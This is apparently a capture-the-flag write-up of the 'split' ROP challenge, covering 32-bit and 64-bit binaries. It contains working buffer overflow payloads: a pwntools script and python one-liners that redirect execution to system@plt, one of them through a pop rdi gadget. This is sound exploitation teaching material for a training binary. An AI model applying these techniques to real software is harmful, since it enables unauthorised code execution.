# SPLIT

In this challenge, we got to explore how parameters can be passed to functions. Note 32-bit and 64-bit will have quite different solutions, and this is likely the case for all later levels.

## 32-bit

More stacks.

  ### Information gathering

  We don't have the ret2win helper function now, but we have something else:

```c
void usefulFunction(void){ // 0x0804860c
  system("/bin/ls");
  return;
}
```

  As revision, We can try inspecting the stack and jumping to the `usefulFunction`.

  If we inspect the ELF further, we can find a `usefulString` in ghidra, or by the [`nm`](https://linux.die.net/man/1/nm) command:

  As stated in the problem description, we have to combine the two parts to win.

  ### Revisiting the stack

  Recall the stack graph:

  ![Stack from Yale](https://flint.cs.yale.edu/cs421/papers/x86-asm/stack-convention.png)

  Notice besides the `ebp` and return address, we can also overwrite the parameters given that the allowed input is large enough.

  ### Devising and implementing the payload

  So we can write `"A"*40+(new ebp position)+(new return address)+(the next return address)+(parameter)` to the stack:

  - The next return address doesn't really matter as we'll have gotten our flag.
  - For the new EBP position, we should set it to the position for the new return address (not the next return address)
  - Parameter is just the `usefulString` pointer
  - There are few candidates to new return address, not all will work though:
    - `0x0804861a` (*usefulFunction + 0xe), corresponding to the system call in `usefulFunction`
    - `0x0804b00c`, corresponding to the `system` thunk. It is accessible in ghidra by checking the reference
    - `0x0804a018`, corresponding to the `system` PLT reference in GOT (.got.plt section), which points back to 0x0804b00c
    - `0x080483e0`, corresponding to the `system` reference in PLT (.plt section). It is accessible in ghidra by futher checking the reference, or in the disassembly in gdb: <br/> <gdb image>

  Here's a brief [guide to GOT and PLT](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html),
  but to my current understanding, using the `system@plt` address shown in pwndbg is good enough.

  The final pwntools script:

``` py
from pwn import *
p = process('./split32')
p.sendafter(b"> ", b"A"*40+p32(0xffffcfec)+p32(0x080483e0)+p32(0x08048462)+p32(0x0804a030))
p.interactive()
```

  ### Extra remark
  
  After comparing with other write-ups, I found out my answer in this part is needlessly complicated and the reason why I didn't arrive at the easier answer. Of the 4 candidates above, only `0x080483e0` gives the correct answer using the payload pattern above. For the others:
  
  - `0x0804b00c` and `0x0804a018` both give boring seg fault.
  - `0x0804861a` is interesting, as `system` was invoked, but with gibberish:

  After some debugging, I realized I was supplying the assembly code at `0x08048462` as string to `system` call:
  
  ![image](https://user-images.githubusercontent.com/114584910/197396903-0b0a88bc-5596-4077-a08d-19caeff51270.png)
  
  A simpler payload `r < <(python3 -c 'from pwn import *;import sys;sys.stdout.buffer.write(b"A"*40+p32(0xffffcfec)+p32(0x0804861a)+p32(0x0804a030))')` would have worked, as we don't need to keep the stack in the shape shown in the graph when we jump into the middle of function.

## 64-bit

More research.

  ### Information gathering

  Useful addresses:

  ```
  usefulString  : 0x601060
  system@plt    : 0x400560
  usefulFunction: 0x400742
  ```

  The 32-bit solution solution won't work even with all addresses changed and `p64` due to another fundamental difference in how 32-bit and 64-bit ELFs work.

  ### Introducing calling conventions and ROP gadgets

  If you looked closer at the disassembly or tried jumping to `usefulFunction` (beware of stack alignment) and added a break point within it,
  you'll notice that the `/bin/ls` is not pushed to the stack:

  ![ghidra usefulFunction uses EDI](https://user-images.githubusercontent.com/114584910/197383207-64198273-ad95-4cbd-bb18-f069fe84b748.png)

  Instead, it's explicitly stated that the RDI register is used:

  ![system uses RDI](https://user-images.githubusercontent.com/114584910/197383234-8ed0ba23-6fd0-42db-94a0-d1edd76ffdaa.png)

  In 64-bit systems, some parameters are not pushed onto the stack and are instead **passed by registers**. Different systems (Windows, linux) have different standards on how to do this.
  This is known as [calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions). (see [here](https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start) for the difference between EDI and RDI)

  So our primary goal is to modify the RDI register. Overwriting the stack itself is not enough, but we can find **gadgets** that can help us with pwntools.

  ![pwntools_gadget](https://user-images.githubusercontent.com/114584910/197383264-3388fa50-7317-4d79-9dc9-287a0d449983.png)

  We have exactly one gadget for changing the value of `rdi`: it pops the toppest value from the stack and stores it to `rdi` and `ret`urns control to the stack.

  ### Devising and implementing the payload

  Here is what we'll do:

  - Write `0x601060` to stack
  - Pop it to RDI using `0x4007c3`
  - Add a `ret` instruction (because of our good ol' friend stack alignment)
  - Jump to `0x400560`

  Debugging in gdb:

```bash
r < <(python3 -c 'from pwn import *;import sys;sys.stdout.buffer.write(b"A"*(40)+p64(0x4007c3)+p64(0x601060)+p64(0x400741)+p64(0x400560))')
```
  
  Writing the pwntools script is trivial from this point.
